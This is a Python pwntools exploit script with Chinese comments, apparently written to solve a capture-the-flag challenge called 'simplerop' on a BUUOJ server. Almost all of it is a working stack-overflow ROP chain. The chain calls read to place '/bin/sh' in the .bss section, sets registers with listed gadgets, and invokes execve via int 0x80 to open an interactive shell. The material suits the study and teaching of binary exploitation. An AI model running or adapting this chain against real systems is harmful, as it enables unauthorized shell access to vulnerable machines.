from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'simplerop'
port = 27608

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
栈溢出
0x0806e82a : pop edx ; ret
0x080bae06 : pop eax ; ret
0x0806e851 : pop ecx ; pop ebx ; ret
0x080493e1 : int 0x80

0x0806e828 : pop esi ; pop ebx ; pop edx ; ret
'''
bss = io_elf.bss()
print(hex(bss))

io.recvuntil(b'Your input :')
# 首先调一下read函数，往bss+0xc0写入/bin/sh\x00
payload = 0x20 * b'a' + p32(io_elf.sym['read']) + p32(0x0806e828) + p32(0) + p32(bss + 0xc0) + p32(0x10)
payload += p32(0x080bae06) + p32(0xb) + p32(0x0806e851) + p32(0) + p32(bss+0xc0) + p32(0x0806e82a) + p32(0) + p32(0x080493e1)
#payload = 0x20 * b'a' + p32(io_elf.sym['read']) + p32(io_elf.sym['main']) + p32(0) + p32(bss + 0xc0) + p32(0x10) 
io.send(payload)
io.send(b'/bin/sh\x00'+b'\x00'*8)

io.interactive()
